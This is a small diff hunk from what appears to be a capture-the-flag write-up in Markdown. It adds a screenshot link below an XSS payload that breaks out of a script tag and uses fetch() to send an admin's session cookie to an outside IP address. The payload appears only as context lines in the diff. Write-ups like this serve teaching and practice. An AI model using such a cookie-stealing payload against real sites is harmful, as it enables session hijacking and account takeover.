@@ -542,6 +542,7 @@ To exfiltrate the admin's `session` cookie, we use the following payload:
 ```bash
 "></script><script>fetch("http://10.10.14.13/?cookies="+document.cookie);</script><"
 ```
+![16](../../../assets/images/Caption/16.png)
 
 <br />
 
